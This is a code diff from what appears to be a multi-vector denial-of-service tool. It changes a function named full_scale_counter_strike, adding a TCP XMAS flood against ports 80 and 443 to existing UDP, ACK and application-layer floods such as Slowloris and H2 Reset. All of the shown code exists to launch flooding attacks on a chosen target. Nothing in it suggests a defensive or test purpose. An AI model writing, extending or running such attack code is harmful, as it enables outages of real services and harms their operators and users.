@@ -178,7 +178,7 @@ def full_scale_counter_strike(target, use_proxy, network_interface):
         f"Slowloris sockets, and {params['h2_threads']} H2 connections.")
 
     # --- Launch Network Layer Floods (L3/L4) ---
-    print("[+] Preparing L3/L4 vectors (UDP, SYN, ICMP, TCP Frag)...")
+    print("[+] Preparing L3/L4 vectors (UDP, SYN, ACK, XMAS, ICMP, TCP Frag)...")
     for port in [53, 123]:  # UDP
         args = ("UDP-Mix", target, port, params["duration"], stop_event, pause_event, params["threads"])
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_udp, args))
@@ -195,6 +195,10 @@ def full_scale_counter_strike(target, use_proxy, network_interface):
     for port in [80, 443]:
         args = (target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_ack_flood, args))
+    # NEW: TCP XMAS Flood on common web ports
+    for port in [80, 443]:
+        args = (target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_xmas_flood, args))
 
     # --- Launch Application Layer Floods (L7) ---
     print("[+] Preparing L7 vectors (DNS Query, POST Flood, Slowloris, H2 Reset)...")
